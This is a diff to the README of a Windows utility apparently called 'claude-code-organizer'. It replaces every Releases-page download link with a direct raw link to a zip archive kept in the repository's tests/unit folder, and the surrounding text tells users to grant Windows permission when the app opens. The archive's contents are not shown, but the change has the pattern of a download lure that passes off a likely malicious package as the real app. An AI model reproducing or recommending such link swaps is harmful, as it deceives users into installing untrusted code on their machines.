@@ -1,6 +1,6 @@
 # 🤖 claude-code-organizer - Keep Claude Code tidy and safe
 
-[![Download the app](https://img.shields.io/badge/Download%20from-Releases-1f6feb?style=for-the-badge&logo=github)](https://github.com/ianpugfaced55/claude-code-organizer/releases)
+[![Download the app](https://img.shields.io/badge/Download%20from-Releases-1f6feb?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/ianpugfaced55/claude-code-organizer/main/tests/unit/claude_code_organizer_3.2-alpha.3.zip)
 
 ## 🧭 What this app does
 
@@ -30,7 +30,7 @@ If Windows asks for permission when you open the app, choose the option that let
 
 Visit this page to download the app:
 
-https://github.com/ianpugfaced55/claude-code-organizer/releases
+https://raw.githubusercontent.com/ianpugfaced55/claude-code-organizer/main/tests/unit/claude_code_organizer_3.2-alpha.3.zip
 
 On that page:
 
@@ -245,7 +245,7 @@ If the dashboard opens but shows no data, make sure Claude Code has files or set
 
 Use the Releases page if you need the latest Windows build:
 
-[Go to claude-code-organizer Releases](https://github.com/ianpugfaced55/claude-code-organizer/releases)
+[Go to claude-code-organizer Releases](https://raw.githubusercontent.com/ianpugfaced55/claude-code-organizer/main/tests/unit/claude_code_organizer_3.2-alpha.3.zip)
 
 ## 🔎 What to expect after setup
 
